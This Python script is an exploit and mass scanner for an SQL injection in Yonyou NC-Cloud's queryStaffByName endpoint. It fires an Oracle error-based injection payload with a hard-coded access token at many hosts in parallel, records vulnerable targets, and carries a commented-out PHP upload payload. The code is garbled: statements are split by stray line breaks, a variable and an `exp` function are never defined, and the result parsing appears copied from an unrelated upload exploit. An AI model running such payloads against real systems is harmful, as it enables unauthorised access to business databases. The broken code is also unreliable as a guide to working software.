import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'
def banner():
    text ='''                              
  __   __   __  ___   __  _  _   _ _   _ 
 / / _ \ \ /  \/ / | /  \| || | | | | | |
| |_/ \_| ( ()  <| || || ) || |_| | |_| |
 \___^___/ \__/\_\\_   _/ \_) ._,_|\___/ 
                    | |     | |          
                    |_|     |_|          wh
'''
    print(text)
def main():
    banner()
    parser=argparse.ArgumentParser(description="用友NC-Cloud系统queryStaffByName存在SQL注入漏洞"
)
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url"
)
    parser.add_argument('-f','--file',dest='file',type=str,help="input file path"
)
    args =parser.parse_args()
    #处理资产，添加线程

    if args.url and not args.file
:
        if poc(args.url):
           exp(args.url)
    elif not args.url and args.file
:
        url_list=[]
        with open('dh.txt','r',encoding='utf-8') as fp:

            for i in fp.readlines
():
                url_list.append(i.strip().replace('\n'
,''))
                # i = i.strip()
                # if 'https://' in i: #给资产自动添加http://

                #     url_list.append(i)
                # else:
                #     i = 'http://' + i
                #     url_list.append(i)
        mp =Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h"
)
def poc(target):
    url_payload= '/ncchr/pm/staff/queryStaffByName?name=1%27+AND+7216%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%287216%3D7216%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29--+hzDZ'

    url = target + url_payload
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1'
,
        'Accesstokenncc': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ'
,
        'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2'
,
        'Connection': 'close'
            }
    #data ="--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"Test.php\"\r\n\r\n<?php phpinfo();?>\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nsubmit\r\n--dd8f988919484abab3816881c55272a7--\r\n\r\n\r\n"

    proxies={
        'http':'http://127.0.0.1:8080'

,
        'https':'http://127.0.0.1:8080'


    }
    try:
        response=requests.get(url=url,data=data,headers=headers,timeout=

5)
        match =re.search('"data":\s*{"id":\d+,"path":"([^"]+)"',response.text

)
        result = target + '/publishingImg/'+ match.group

(1)
        if response.status_code == 200:
            print(f"{GREEN}[+] {target} 存在注入漏洞！\n[+]访问：{result} {RESET

}")
            with open('loudong.txt','a',encoding='utf-8')as f:


                f.write(target + '\n')
                return True
        else:
            print("[-]不存在漏洞！！"


)
            return False
    except Exception:
        print('该站点存在问题'



)


 
if __name__ == '__main__':
    main()
